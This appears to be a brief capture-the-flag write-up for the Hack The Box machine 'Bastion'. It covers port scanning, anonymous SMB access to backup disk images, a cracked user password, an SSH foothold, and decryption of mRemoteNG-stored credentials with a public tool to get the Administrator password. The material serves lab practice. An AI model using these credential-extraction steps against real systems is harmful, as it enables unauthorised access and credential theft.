----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# Bastion
# 17/4/2023
10.10.10.134

----------------------------------------------------
# nmap
----------------------------------------------------
PORT    STATE SERVICE      VERSION
22/tcp  open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds


----------------------------------------------------
# enum
----------------------------------------------------
└─$ smbclient -L //10.10.10.134     
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        Backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC


└─$ smbclient -N //10.10.10.134/Backups 
smb: \WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\> ls
  9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd     An 37761024  Fri Feb 22 07:44:03 2019
  9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd     An 5418299392  Fri Feb 22 07:45:32 2019
The hash is cracked as bureaulampje.

----------------------------------------------------
# foothold
----------------------------------------------------
Using the credentials l4mpje / bureaulampje we can now login via SSH.

----------------------------------------------------
# priv esc
----------------------------------------------------
cd C:\Progra~2
dir
cd mRemoteNG

We find mRemoteNG to be installed. A quick google search about it says that it’s a remote
connection manager and stores credentials too

Looking at the changelog.txt we that the version is 1.76.11.

The software stores it’s configuration in C:\Users\L4mpje\AppData\Roaming\mRemoteNG in
the file confCons.xml. Let's check it out.

cd C:\Users\UserName\AppData\Roaming\mRemoteNG
confCons.xml

aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==

decrypt it 

We obtain the password as thXLHM96BeKL0ER2. We can now SSH in as the Administrator.




method to decrypt
Around the time Bastion came out, mremoteng-decrypt showed up on GitHub. At the time, there was only a java release, which I downloaded and ran here, and it worked:

git@github.com:kmahyyg/mremoteng-decrypt.git

java -jar decipher_mremoteng.jar V22XaC5eW4epRxRgXEM5RjuQe2UNrHaZSGMUenOvA1Cit/z3v1fUfZmGMglsiaICSus+bOwJQ/4AnYAt2AeE8g==

java -jar decipher_mremoteng.jar OuhzIwEZtD30y9QFzUOGDDoHnaSWGQFHcD5YSnj/YoJ2sE41GLoykzMgEAZh940z8pKetHSQDonI5/z7